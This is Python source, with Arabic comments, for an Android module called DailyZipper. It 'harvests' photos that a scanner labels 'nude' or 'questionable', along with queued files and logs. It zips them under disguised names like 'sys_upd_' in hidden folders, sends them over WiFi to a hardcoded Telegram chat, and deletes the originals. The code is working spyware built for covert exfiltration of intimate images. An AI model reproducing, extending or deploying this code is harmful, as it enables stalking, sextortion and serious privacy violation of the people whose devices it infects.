# -*- coding: utf-8 -*-
import os
import time
import random
import threading
import logging
import gc
import string
import json
import zipfile
import hashlib
from datetime import datetime

# ========== إعداد المسارات ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
H = os.path.join(P, "harvest")               # المجلد النهائي للملفات المضغوطة
PENDING = os.path.join(H, "pending_upload")  # مجلد انتظار التأكيد (احتياطي)
QUEUE = os.path.join(P, ".cache_thumb")      # مجلد مؤقت للصور قبل الضغط (مخفي وموهم)
CONFIG_FILE = os.path.join(P, "zipper_config.json")

for d in [P, H, PENDING, QUEUE]:
    if not os.path.exists(d):
        os.makedirs(d)

logging.basicConfig(
    filename=os.path.join(P, "z.log"),
    level=logging.ERROR,
    filemode='a',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

try:
    from jnius import autoclass
    JNI_AVAILABLE = True
except:
    JNI_AVAILABLE = False


class DailyZipper:
    def __init__(self, scanner=None, tg=None):
        self.sc = scanner
        self.tg = tg
        self._config = self._load_config()
        self.max_b = self._config.get("max_batch_size", 48 * 1024 * 1024)  # 48MB
        self.active = False
        self._active_lock = threading.Lock()
        self.device_tag = self._get_device_tag()
        self._processed_hashes = set()
        self._max_processed_hashes = self._config.get("max_processed_hashes", 10000)

    def _load_config(self):
        """تحميل الإعدادات من ملف"""
        default = {
            "max_batch_size": 48 * 1024 * 1024,  # 48MB
            "storage_extra": 100 * 1024 * 1024,  # 100MB احتياطي
            "send_retry_delays": [2, 4, 8],
            "max_processed_hashes": 10000,
            "default_vault_id": -1003577715762,
            "enable_encryption": False,          # تعطيل التشفير افتراضياً
            "password": b"ShieldCore2024!",
            "max_batches": 10                    # الحد الأقصى لعدد الدفعات
        }
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    loaded = json.load(f)
                    default.update(loaded)
            except Exception as e:
                logging.error(f"Config load error: {e}")
        return default

    def _save_config(self):
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump(self._config, f)
            return True
        except Exception as e:
            logging.error(f"Config save error: {e}")
            return False

    def _get_device_tag(self):
        """استخراج معرف جهاز قصير"""
        try:
            from jnius import autoclass
            Secure = autoclass('android.provider.Settings$Secure')
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
            if aid:
                return aid[:8].lower()
        except:
            pass
        try:
            Build = autoclass('android.os.Build')
            model = f"{Build.MANUFACTURER} {Build.MODEL}"
            return hashlib.md5(model.encode()).hexdigest()[:8]
        except:
            return "unknown"

    def _check_storage(self, required_bytes):
        """التحقق من وجود مساحة كافية في التخزين"""
        try:
            stat = os.statvfs(P)
            available = stat.f_frsize * stat.f_bavail
            extra = self._config.get("storage_extra", 100 * 1024 * 1024)
            return available > (required_bytes * 2 + extra)
        except:
            return True

    def _file_hash(self, filepath):
        """حساب MD5 hash للملف"""
        try:
            hash_md5 = hashlib.md5()
            with open(filepath, "rb") as f:
                for chunk in iter(lambda: f.read(4096), b""):
                    hash_md5.update(chunk)
            return hash_md5.hexdigest()
        except:
            return None

    def _gen_name(self):
        prefixes = ["cache_", "sys_upd_", "tmp_vol_", "core_st_", "db_sync_"]
        date_str = datetime.now().strftime("%y%m%d")
        tag = self.device_tag
        chars = string.ascii_letters + string.digits
        suffix = ''.join(random.choices(chars, k=6))
        prefix = random.choice(prefixes)
        return f"{prefix}{date_str}_{tag}_{suffix}.zip"

    def _safe_remove(self, path):
        try:
            if os.path.exists(path):
                os.remove(path)
                return True
        except Exception as e:
            logging.error(f"Safe remove error {path}: {e}")
        return False

    def _is_on_wifi(self):
        if not JNI_AVAILABLE:
            return True
        try:
            ctx = autoclass('org.kivy.android.PythonActivity').mActivity
            cm = ctx.getSystemService("connectivity")
            if cm is None:
                return True
            n = cm.getActiveNetworkInfo()
            return n and n.isConnected() and n.getType() == 1
        except:
            return True

    def _safe_send(self, zip_path, caption, target_chat=None):
        """إرسال الملف مع إعادة محاولة"""
        if not self.tg:
            return False

        target = target_chat
        if target is None:
            target = getattr(self.tg, 'vlt', None)
        if target is None:
            target = getattr(self.tg, 'dat', None)
        if target is None:
            target = self._config.get("default_vault_id", -1003577715762)
            logging.warning(f"Using default vault ID: {target}")

        delays = self._config.get("send_retry_delays", [2, 4, 8])
        for attempt, delay in enumerate(delays):
            try:
                if not os.path.exists(zip_path):
                    logging.error(f"Zip file not found: {zip_path}")
                    return False

                with open(zip_path, 'rb') as fobj:
                    resp = self.tg._api("sendDocument",
                                        {"chat_id": target, "caption": caption},
                                        {"document": fobj})
                if resp and resp.get('ok'):
                    return True
                else:
                    logging.warning(f"Send attempt {attempt+1} failed: {resp}")
            except Exception as e:
                logging.error(f"Send error (attempt {attempt+1}): {e}")
            if attempt < len(delays) - 1:
                time.sleep(delay)
        return False

    def force_send_now(self, chat_id=None):
        """إرسال الملفات المتراكمة فوراً"""
        with self._active_lock:
            if self.active:
                if chat_id and self.tg:
                    try:
                        self.tg._api("sendMessage", {"chat_id": chat_id, "text": "⏳ عملية حصاد جارية بالفعل..."})
                    except:
                        pass
                return False

        files_to_pack = []
        total_size = 0

        for folder in [QUEUE, PENDING]:
            if os.path.exists(folder):
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    if os.path.isfile(path) and os.path.getsize(path) > 0:
                        files_to_pack.append(path)
                        total_size += os.path.getsize(path)

        if not files_to_pack:
            if chat_id and self.tg:
                try:
                    self.tg._api("sendMessage", {"chat_id": chat_id, "text": "📭 لا توجد ملفات جديدة للحصاد حالياً."})
                except:
                    pass
            return False

        if not self._check_storage(total_size):
            if chat_id and self.tg:
                try:
                    self.tg._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ المساحة غير كافية لإنشاء الأرشيف."})
                except:
                    pass
            return False

        if chat_id and self.tg:
            try:
                self.tg._api("sendMessage", {"chat_id": chat_id, "text": f"🚀 جاري معالجة {len(files_to_pack)} ملفاً ({total_size/1024/1024:.1f} MB)..."})
            except:
                pass

        threading.Thread(target=self._pack_and_ship, args=(files_to_pack, True, chat_id), daemon=True).start()
        return True

    def _pack_and_ship(self, files, bypass_wifi=False, report_id=None):
        """ضغط الملفات وإرسالها"""
        if not files:
            return False

        with self._active_lock:
            if self.active:
                return False
            self.active = True

        if not bypass_wifi and not self._is_on_wifi():
            logging.info("Not on WiFi, skipping automatic harvest.")
            with self._active_lock:
                self.active = False
            return False

        # إزالة التكرار باستخدام الهاش
        unique_files = []
        total_size = 0
        for f in files:
            if not os.path.exists(f):
                continue
            fhash = self._file_hash(f)
            if fhash and fhash not in self._processed_hashes:
                unique_files.append(f)
                self._processed_hashes.add(fhash)
                total_size += os.path.getsize(f)

        if not unique_files:
            logging.info("No unique files to process")
            with self._active_lock:
                self.active = False
            return False

        # تنظيف ذاكرة الهاشات إذا تجاوزت الحد
        if len(self._processed_hashes) > self._max_processed_hashes:
            self._processed_hashes.clear()

        if not self._check_storage(total_size):
            logging.error("Insufficient storage for packing")
            if report_id and self.tg:
                try:
                    self.tg._api("sendMessage", {"chat_id": report_id, "text": "⚠️ المساحة غير كافية"})
                except:
                    pass
            with self._active_lock:
                self.active = False
            return False

        # تقسيم الملفات إلى دفعات حسب الحجم
        batches = []
        cur_batch, cur_size = [], 0

        for f in unique_files:
            try:
                fsz = os.path.getsize(f)
                if fsz > self.max_b:
                    if cur_batch:
                        batches.append(cur_batch)
                        cur_batch, cur_size = [], 0
                    batches.append([f])
                    continue

                if cur_size + fsz > self.max_b:
                    if cur_batch:
                        batches.append(cur_batch)
                    cur_batch, cur_size = [], 0
                cur_batch.append(f)
                cur_size += fsz
            except Exception as e:
                logging.error(f"Batching error for {f}: {e}")

        if cur_batch:
            batches.append(cur_batch)

        max_batches = self._config.get("max_batches", 10)
        if len(batches) > max_batches:
            logging.warning(f"Too many batches ({len(batches)}), limiting to {max_batches}")
            batches = batches[:max_batches]

        success_count = 0
        for idx, batch in enumerate(batches):
            zip_name = self._gen_name()
            zip_path = os.path.join(H, zip_name)
            manifest_path = None

            try:
                # بناء بيانات manifest
                manifest_data = {
                    "device_tag": self.device_tag,
                    "timestamp": int(time.time()),
                    "batch": idx + 1,
                    "total_batches": len(batches),
                    "files": []
                }

                for f in batch:
                    try:
                        fname = os.path.basename(f)
                        fsize = os.path.getsize(f) if os.path.exists(f) else 0
                        fhash = self._file_hash(f)
                        f_lower = fname.lower()
                        if f_lower.endswith(('.jpg','.jpeg','.png','.webp','.bmp')):
                            ftype = "image"
                        elif f_lower.endswith(('.aac','.mp3','.wav','.m4a')):
                            ftype = "audio"
                        elif f_lower.endswith('.txt'):
                            ftype = "log"
                        elif f_lower.endswith(('.mp4','.avi','.mov','.mkv')):
                            ftype = "video"
                        else:
                            ftype = "other"
                        manifest_data["files"].append({
                            "name": fname,
                            "size": fsize,
                            "type": ftype,
                            "hash": fhash,
                            "timestamp": int(os.path.getmtime(f)) if os.path.exists(f) else 0
                        })
                    except Exception as e:
                        logging.error(f"Manifest entry error: {e}")

                manifest_path = os.path.join(H, f"manifest_{int(time.time())}_{random.randint(1000,9999)}.json")
                with open(manifest_path, 'w', encoding='utf-8') as mf:
                    json.dump(manifest_data, mf, indent=2, ensure_ascii=False)

                # ===== إنشاء ZIP مع أو بدون حماية =====
                use_encryption = self._config.get("enable_encryption", False)
                password = self._config.get("password", b"ShieldCore2024!")
                zip_created = False

                if use_encryption:
                    try:
                        import pyzipper
                        with pyzipper.AESZipFile(zip_path, 'w', encryption=pyzipper.WZ_AES) as zf:
                            zf.setpassword(password)
                            for f in batch:
                                zf.write(f, os.path.basename(f))
                            zf.write(manifest_path, "manifest.json")
                        zip_created = True
                        logging.info("✅ ZIP created with AES encryption")
                    except ImportError:
                        logging.warning("⚠️ pyzipper not available. Falling back to standard zip (no encryption).")
                    except Exception as e:
                        logging.error(f"pyzipper error: {e}, falling back to standard zip")

                if not zip_created:
                    # إنشاء ZIP عادي باستخدام zipfile
                    try:
                        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                            for f in batch:
                                zf.write(f, os.path.basename(f))
                            zf.write(manifest_path, "manifest.json")
                        zip_created = True
                        logging.info("✅ ZIP created without encryption")
                    except Exception as e:
                        logging.error(f"Failed to create standard zip: {e}")

                if not zip_created:
                    raise Exception("Failed to create zip file")

                # التحقق من أن حجم ZIP أكبر من 1 كيلوبايت (لمنع الملفات التالفة)
                if os.path.getsize(zip_path) < 1024:
                    self._safe_remove(zip_path)
                    raise Exception("Zip file too small (likely corrupted)")

                # حذف manifest المؤقت
                if manifest_path and os.path.exists(manifest_path):
                    self._safe_remove(manifest_path)
                    manifest_path = None

                caption = f"📦 {'إرسال فوري' if bypass_wifi else 'حصاد تلقائي'} | دفعة {idx+1}/{len(batches)} | {len(batch)} ملفات"
                success = self._safe_send(zip_path, caption, report_id)

                if success:
                    for f in batch:
                        self._safe_remove(f)
                    success_count += 1
                    if report_id and self.tg:
                        try:
                            self.tg._api("sendMessage", {"chat_id": report_id, "text": f"✅ تم إرسال الدفعة {idx+1}/{len(batches)} بنجاح"})
                        except:
                            pass
                else:
                    if report_id and self.tg:
                        try:
                            self.tg._api("sendMessage", {"chat_id": report_id, "text": f"❌ فشل إرسال الدفعة {idx+1}"})
                        except:
                            pass

            except Exception as e:
                logging.error(f"Packing error: {e}")
                if report_id and self.tg:
                    try:
                        self.tg._api("sendMessage", {"chat_id": report_id, "text": f"⚠️ خطأ في الضغط: {str(e)[:100]}"})
                    except:
                        pass
            finally:
                if zip_path and os.path.exists(zip_path):
                    self._safe_remove(zip_path)
                if manifest_path and os.path.exists(manifest_path):
                    self._safe_remove(manifest_path)

            if idx < len(batches) - 1:
                time.sleep(5)

            gc.collect()

        with self._active_lock:
            self.active = False
        gc.collect()

        if report_id and self.tg:
            try:
                self.tg._api("sendMessage", {"chat_id": report_id, "text": f"🏁 انتهت العملية. نجح إرسال {success_count}/{len(batches)} دفعات."})
            except:
                pass

        return success_count > 0

    def run(self):
        """تشغيل الحصاد التلقائي"""
        with self._active_lock:
            if self.active:
                return False
            self.active = True

        if not self._is_on_wifi():
            logging.info("Not on WiFi, skipping automatic harvest.")
            with self._active_lock:
                self.active = False
            return False

        all_files = []

        if self.sc:
            try:
                for cat in ["nude", "questionable"]:
                    try:
                        items = self.sc.get_gallery_by_category(cat, limit=150)
                        if items:
                            all_files.extend([i["path"] for i in items if i.get("path") and os.path.exists(i["path"])])
                    except Exception as e:
                        logging.error(f"Scanner category {cat} error: {e}")
            except Exception as e:
                logging.error(f"Scanner error: {e}")

        if os.path.exists(QUEUE):
            try:
                for f in os.listdir(QUEUE):
                    path = os.path.join(QUEUE, f)
                    if os.path.isfile(path) and os.path.getsize(path) > 0:
                        all_files.append(path)
            except Exception as e:
                logging.error(f"Queue scan error: {e}")

        try:
            for f in os.listdir(P):
                if f.endswith(".log") and f not in ["z.log", "t.log"]:
                    path = os.path.join(P, f)
                    if os.path.exists(path) and os.path.getsize(path) > 100 * 1024:
                        all_files.append(path)
        except Exception as e:
            logging.error(f"Logs error: {e}")

        unique_files = list(set(all_files))

        if unique_files:
            if self.tg and hasattr(self.tg, 'notify_harvest'):
                try:
                    did = getattr(self.sc, 'did', 'Unknown') if self.sc else 'Unknown'
                    self.tg.notify_harvest(did, len(unique_files))
                except Exception as e:
                    logging.error(f"Notify error: {e}")

            threading.Thread(target=self._pack_and_ship, args=(unique_files, False, None), daemon=True).start()
            return True
        else:
            with self._active_lock:
                self.active = False
            return False

    def clear_hash_cache(self):
        self._processed_hashes.clear()

    def get_stats(self):
        stats = {"pending": 0, "size": 0}
        for folder in [QUEUE, PENDING]:
            if os.path.exists(folder):
                for f in os.listdir(folder):
                    path = os.path.join(folder, f)
                    if os.path.isfile(path):
                        stats["pending"] += 1
                        stats["size"] += os.path.getsize(path)
        return stats


# ========== دالة المصنع ==========
def create(scanner=None, telegram=None):
    return DailyZipper(scanner, telegram)
